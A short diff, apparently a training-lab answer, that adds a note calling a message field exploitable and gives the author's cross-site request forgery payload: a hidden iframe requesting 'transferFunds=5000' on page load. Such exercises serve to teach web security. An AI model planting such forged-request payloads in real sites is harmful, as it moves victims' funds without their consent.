@@ -1,0 +1,3 @@
+The message field is exploitable. The following is the exploit I crafted. 
+
+<iframe id="scrfFrame" src="attack?Screen=284&menu=900&transferFunds=5000"></iframe>
